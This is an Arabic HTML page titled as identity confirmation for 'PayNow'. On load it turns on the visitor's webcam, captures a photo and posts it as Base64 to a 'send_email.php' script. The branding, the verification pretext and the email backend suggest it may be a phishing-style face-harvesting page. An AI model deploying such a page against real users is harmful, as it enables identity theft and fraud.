<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الهوية - PayNow</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f8f9fa;
        }
        .container {
            margin-top: 20px;
        }
        video, canvas {
            border: 2px solid #007bff;
            border-radius: 10px;
            margin-top: 10px;
        }
        button {
            background-color: #007bff;
            color: white;
            padding: 10px;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

    <h1>الرجاء تأكيد الهوية</h1>
    <p>يرجى التقاط صورة واضحة لمتابعة عملية التسجيل.</p>

    <div class="container">
        <video id="video" width="320" height="240" autoplay></video>
        <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
        <br>
        <button onclick="captureImage()">التقاط الصورة</button>
    </div>

    <script>
        // تشغيل الكاميرا عند فتح الصفحة
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                document.getElementById("video").srcObject = stream;
            })
            .catch(function(error) {
                alert("تعذر الوصول إلى الكاميرا: " + error);
            });

        function captureImage() {
            const video = document.getElementById("video");
            const canvas = document.getElementById("canvas");
            const context = canvas.getContext("2d");

            // التقاط الصورة من الفيديو
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // تحويل الصورة إلى بيانات Base64
            const imageData = canvas.toDataURL("image/png");

            // إرسال الصورة إلى الخادم
            sendImageToServer(imageData);
        }

        function sendImageToServer(imageData) {
            fetch("send_email.php", {
                method: "POST",
                body: JSON.stringify({ image: imageData }),
                headers: { "Content-Type": "application/json" }
            })
            .then(response => response.text())
            .then(data => alert(data))
            .catch(error => alert("فشل الإرسال: " + error));
        }
    </script>

</body>
</html>
